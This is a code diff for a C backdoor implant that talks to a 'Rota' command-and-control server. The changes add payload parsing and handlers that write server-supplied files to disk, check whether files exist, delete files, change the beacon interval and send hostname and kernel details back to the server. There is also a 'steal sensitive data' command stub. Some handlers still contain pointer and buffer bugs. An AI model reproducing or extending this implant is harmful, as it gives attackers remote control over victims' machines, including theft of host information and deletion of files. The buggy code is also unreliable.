@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <dlfcn.h>
 #include <stdbool.h>
+#include <fcntl.h>
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
@@ -35,8 +36,9 @@ void c2_loop(){
         sleep(3);
         c2_loop();
     }
+
     if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
-        fprintf(stderr, "could not connect to server\n");
+        fprintf(stderr, "[!] Could not connect to server...\n");
         sleep(3);
         c2_loop();
     }
@@ -58,55 +60,74 @@ void c2_loop(){
         maxlen -= n;
         len += n;
 
-        printf("Data received: %s\n", buffer);
+        char *cmd_id = (char *)malloc(2);
+        int payload_length;
 
-        char *cmd_id = (char *)malloc(4);
-        memset(cmd_id, 0, 4);
-        memcpy(cmd_id, &buffer[27], 4);
+        // zero out cmd id
+        memset(cmd_id, 0, 2);
+        memcpy(cmd_id, &buffer[27], 2);
+
+        // parse out cmd id
         cmd_id = parse_c2_cmdid(buffer);
+        // get payload length
+        payload_length = parse_c2_payload_len(buffer);
+
+        char *payload= parse_c2_payload(buffer, payload_length);
+
+        #ifdef DEBUG
+        printf("Payload length is %d\n", payload_length);
+        #endif
 
         // exit ==> 0x13 0x8E 0x3E 0x06
-        if (memcmp(&rota_c2_exit, &cmd_id, 4) == 0) {
+        if (memcmp(&rota_c2_exit, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run exiting!");
             #endif
             c2_exit(sock);
         }
         // perform a "PING"/"PONG" connectivity test
-        else if (memcmp(&rota_c2_test, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_test, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 ping/ping!");
             #endif
 
             char *buffer = "PING";
-            build_c2_response(buffer, *cmd_id, sock);
+            build_c2_response(buffer, cmd_id, sock);
 
         }
-        else if (memcmp(&rota_c2_heartbeat, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_heartbeat, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 heartbeat!");
             #endif
-            char *buffer = "Heartbeet";
-            build_c2_response(buffer, *cmd_id, sock);
+            char *buffer = "PING";
+            build_c2_response(buffer, cmd_id, sock);
 
         }
-        else if (memcmp(&rota_c2_set_timeout, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_set_timeout, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 set timeout!");
             #endif
-            // TODO parse payload and update second parameter with new time.
-            // having 10 seconds as a place holder for now.
-            c2_set_timeout(&sleepy_time, 10);
-            char *buffer = "sleepy time updated!";
-            build_c2_response(buffer, *cmd_id, sock);
+
+            // convert c2 sleep time
+            int new_sleepy_time;
+            memcpy(&new_sleepy_time, payload, sizeof(int));
+            // update c2 sleep time
+            c2_set_timeout(&sleepy_time, new_sleepy_time);
+            char *msg= "sleepy time updated !";
+
+            #ifdef DEBUG
+            printf("New sleep time is: %d", sleepy_time);
+            #endif
+
+            build_c2_response(msg, cmd_id, sock);
         }
-        else if (memcmp(&rota_c2_steal_data, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_steal_data, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run steal sensitive data\n");
             #endif
 
         }
-        else if (memcmp(&rota_c2_upload_dev_info, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run upload dev info\n");
             #endif
@@ -114,49 +135,86 @@ void c2_loop(){
             char *buffer = (char *)malloc(200);
             c2_upload_device_info(buffer);
             // buffer is now populated as hostname-Linux-kernel-version
-            build_c2_response(buffer, *cmd_id, sock);
+            build_c2_response(buffer, cmd_id, sock);
         }
-        else if (memcmp(&rota_c2_upload_file, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_upload_file, cmd_id, 2) == 0) {
             #ifdef DEBUG
-            printf("[+] Rota C2 Run upload\n");
+            printf("[+] Rota C2 upload file \n");
             #endif
 
-            build_c2_response(buffer, *cmd_id, sock);
+            // TODO - break this out into a stub function
+            FILE *fd = fopen("localFile", "w+");
+            fwrite(payload, sizeof(payload[0]), payload_length, fd);
+            fclose(fd);
+
+            build_c2_response(buffer, cmd_id, sock);
 
         }
-        else if (memcmp(&rota_c2_query_file, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_query_file, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run query file\n");
             #endif
 
             // get fpath as the "payload" portion of the Rota packet.
-            char *fpath = &buffer[82];
-            bool result = c2_query_file(fpath);
-
+            bool result = c2_query_file(payload);
 
             #ifdef DEBUG
-            printf("file path %s results in %d", fpath, result);
+            printf("file path %s results in %d\n", payload, result);
             #endif
 
+            if (result == true) {
+                char *msg = "file exists";
+                build_c2_response(msg, cmd_id, sock);
+            } else {
+                char *msg = "file does not exist";
+                build_c2_response(msg, cmd_id, sock);
+            }
+
         }
-        else if (memcmp(&rota_c2_delete_file, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_delete_file, cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run delete file\n");
             #endif
 
+            bool result = c2_query_file(payload);
+            if (result == true) {
+
+                int res = unlink(payload);
+                if (res == 0) {
+
+                    #ifdef DEBUG
+                    printf("file deletion of %s successful", payload);
+                    #endif
+
+                    char *msg = "file deleted";
+                    build_c2_response(msg, cmd_id, sock);
+                } else {
+                    #ifdef DEBUG
+                    printf("file deletion of %s was unsuccessful", payload);
+                    #endif
+                    char *msg = "file could not be deleted";
+                    build_c2_response(msg, cmd_id, sock);
+                }
+            } else {
+                    #ifdef DEBUG
+                    printf("file %s does not exist", payload);
+                    #endif
+                char *msg = "file does not exist";
+                build_c2_response(msg, cmd_id, sock);
+            }
         }
-        else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run Plugin 1\n");
             #endif
         }
-        else if (memcmp(&rota_c2_run_plugin_2, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_run_plugin_2, &cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run Plugin 2\n");
             #endif
 
         }
-        else if (memcmp(&rota_c2_run_plugin_3, &cmd_id, 4) == 0) {
+        else if (memcmp(&rota_c2_run_plugin_3, &cmd_id, 2) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run Plugin 3\n");
             #endif
@@ -274,7 +332,7 @@ void c2_upload_device_info(char *buffer) {
 bool c2_query_file(char *fpath) {
 
     // F_OK == existence test
-    if ((access(fpath, F_OK))) {
+    if ((access(fpath, F_OK)) == 0) {
         return true;
     }
 
@@ -333,23 +391,6 @@ char *initial_rota_pkt() {
     return rotaHdr;
 }
 
-
-char *parse_c2_payload(char *buffer) {
-
-    int payload_len = buffer[4];
-    char *payload = (char *)malloc(payload_len);
-
-    if (payload == NULL){
-        #ifdef DEBUG
-        fprintf(stderr, "error allocating data in parse_c2_pkt");
-        #endif
-        exit(1);
-    }
-
-    return payload;
-}
-
-
 char *parse_c2_cmdid(char *buffer) {
     char *cmd_id  = (char *)malloc(4);
     memset(cmd_id, 0, 4);
@@ -357,17 +398,43 @@ char *parse_c2_cmdid(char *buffer) {
     return cmd_id;
 }
 
+int parse_c2_payload_len(char *buffer) {
 
-void build_c2_response(char *buffer, char cmd_id, int sock){
+    int len;
+    // convert char to integer
+    memcpy(&len, &buffer[4], sizeof(int));
+    return len;
+}
+
+char *parse_c2_payload( char *buffer, int length) {
+
+    char *payload = (char *)malloc(length);
+    if (!payload){
+        #ifdef DEBUG
+        fprintf(stderr, "error allocating data in parse_c2_pkt");
+        #endif
+        exit(1);
+    }
+    memset(payload, 0, length);
+    // copy last N-bytes from rota payload
+    memcpy(payload, &buffer[82], length);
+    return payload;
+}
+
+void build_c2_response(char *buffer, char *cmd_id, int sock){
 
     char *rota_resp_pkt = initial_rota_pkt();
 
     // correct length of payload on buffer
     int buffer_len = strlen(buffer);
-    memcpy(&rota_resp_pkt[4], &buffer_len, buffer_len);
+    char buffer_len_hex[4] = {0x00};
+
+    // convert and store integer in rota header
+    sprintf(buffer_len_hex, "%d", buffer_len);
+    memcpy(&rota_resp_pkt[4], buffer_len_hex, sizeof(buffer_len));
 
     // update cmd_id in response packet
-    memcpy(&rota_resp_pkt[27], &cmd_id, sizeof(cmd_id));
+    memcpy(&rota_resp_pkt[27], cmd_id, sizeof(cmd_id));
 
     // reallocate space from 82 byte header + response "body"
     rota_resp_pkt = realloc(rota_resp_pkt, (82 + buffer_len));
